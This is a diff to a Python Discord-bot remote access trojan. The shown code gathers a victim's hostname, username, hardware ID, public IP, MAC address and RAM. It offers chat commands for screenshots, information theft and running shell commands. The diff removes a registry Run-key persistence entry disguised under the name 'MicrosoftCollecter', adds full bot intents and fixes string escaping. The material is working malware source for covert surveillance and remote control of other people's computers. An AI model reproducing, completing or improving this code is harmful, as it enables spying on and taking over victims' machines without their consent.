@@ -18,7 +18,7 @@ import ctypes
 from discord.ext.commands import Context
 
 
-intents = discord.Intents.default()
+intents = discord.Intents.all()
 intents.all()
 intents.guilds = True
 intents.messages = True
@@ -31,12 +31,7 @@ permissions.administrator = True
 client = discord.Client(intents=intents)
 
 
-file_path = os.path.abspath(sys.argv[0])
-register = ["reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Run", "/v", "MicrosoftCollecter", "/t", "REG_SZ", "/d", file_path]
-subprocess.call(['echo', 'y', '|'] + register, shell=True)
-
-
-token = "YOUR_TOKEN_HERE"
+token = "YOUR_DISCORD_TOKEN_HERE"
 
 temp = os.getenv("temp")
 temp_path = os.path.join(temp, ''.join(random.choices(
@@ -54,7 +49,7 @@ ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', 
                   shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
 username = os.getenv("UserName")
 hostname = os.getenv("COMPUTERNAME")
-hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
+hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
 ip = requests.get('https://api.ipify.org').text
 mac = subprocess.check_output("getmac", shell=True, stdin=subprocess.PIPE,
@@ -631,7 +626,7 @@ async def helpmsg(ctx):
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    await ctx.channel.send("""```
+    await ctx.channel.send(r"""```
 !helpme : Shows Commands. 
 !ss (number) : Take Screenshot.
 !getinfo : Get Them Info.
@@ -683,7 +678,7 @@ async def cmd(ctx):
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    await ctx.channel.send("""```
+    await ctx.channel.send(r"""```
 
 Usage: dir
 Example: Lists files and directories in the current directory.
